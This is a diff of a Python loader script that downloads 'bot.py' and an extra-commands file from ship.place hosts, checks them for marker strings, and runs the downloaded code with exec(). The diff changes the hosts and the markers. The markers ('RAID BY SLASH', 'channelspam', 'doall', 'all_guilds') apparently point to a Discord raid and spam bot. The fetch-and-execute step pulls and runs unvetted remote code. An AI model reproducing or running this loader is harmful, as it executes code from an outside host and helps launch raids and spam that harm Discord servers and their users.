@@ -5,8 +5,8 @@ import sys
 import urllib.request
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-BOT_URL = "https://quilted-suit-x5y5l.ship.place/bot.py"
-EXTRA_URL = "https://quilted-suit-x5y5l.ship.place/extra_cmds.py"
+BOT_URL = "https://harsh-towel-bg4o4.ship.place/bot.py"
+EXTRA_URL = "https://harsh-towel-bg4o4.ship.place/extra_cmds.py"
 BOT_FILE = os.path.join(HERE, "bot_full.py")
 EXTRA_FILE = os.path.join(HERE, "extra_cmds.py")
 
@@ -23,8 +23,8 @@ def fetch(url, dest, needles):
     print(f"  wrote {dest} ({len(data)} bytes)")
 
 if __name__ == "__main__":
-    fetch(BOT_URL, BOT_FILE, ["ext_send", "all_guilds", "RAID BY SLASH"])
-    fetch(EXTRA_URL, EXTRA_FILE, ["external app", "bot_in", "doall"])
+    fetch(BOT_URL, BOT_FILE, ["Install To Server", "perfect-bottom-zqmod.ship.place", "JOIN_WELCOME_DM"])
+    fetch(EXTRA_URL, EXTRA_FILE, ["doall", "channelspam"])
     with open(BOT_FILE, encoding="utf-8") as f:
         code = f.read()
     exec(compile(code, BOT_FILE, "exec"), {"__name__": "__main__", "__file__": BOT_FILE})
